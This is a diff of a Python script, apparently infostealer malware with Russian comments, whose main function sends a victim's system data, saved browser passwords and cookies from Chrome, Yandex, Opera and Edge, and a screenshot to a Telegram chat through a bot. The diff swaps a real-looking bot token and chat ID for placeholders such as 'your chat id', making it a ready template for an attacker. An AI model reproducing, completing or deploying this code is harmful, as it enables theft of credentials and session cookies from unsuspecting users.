@@ -270,20 +270,20 @@ def get_cookie_edge():
 #                      Отправка полученных данных                       #
 #########################################################################
 def main(): 
-    bot = telebot.TeleBot("1682325904:AAGZxqX1f5x956QkBfqDaxH_soyEoUuhFJY")
+    bot = telebot.TeleBot("token")
     
-    bot.send_message(-1001342912509, get_data())
-    bot.send_message(-1001342912509, get_passwd_chrome())
-    bot.send_message(-1001342912509, get_passwd_yandex())
-    bot.send_message(-1001342912509, get_passwd_opera())
-    bot.send_message(-1001342912509, get_passwd_edge())
-    bot.send_message(-1001342912509, get_cookie_chrome())
-    bot.send_message(-1001342912509, get_cookie_yandex())
-    bot.send_message(-1001342912509, get_cookie_opera())
-    bot.send_message(-1001342912509, get_cookie_edge())
+    bot.send_message(id вашего чата, get_data())
+    bot.send_message(id вашего чата, get_passwd_chrome())
+    bot.send_message(id вашего чата, get_passwd_yandex())
+    bot.send_message(id вашего чата, get_passwd_opera())
+    bot.send_message(id вашего чата, get_passwd_edge())
+    bot.send_message(id вашего чата, get_cookie_chrome())
+    bot.send_message(id вашего чата, get_cookie_yandex())
+    bot.send_message(id вашего чата, get_cookie_opera())
+    bot.send_message(id вашего чата, get_cookie_edge())
     time.sleep(20)
     screenshot()
-    bot.send_photo(-1001342912509, photo = open("screen.png", "rb"))
+    bot.send_photo(id вашего чата, photo = open("screen.png", "rb"))
     os.remove("screen.png")
     bot.polling()
     
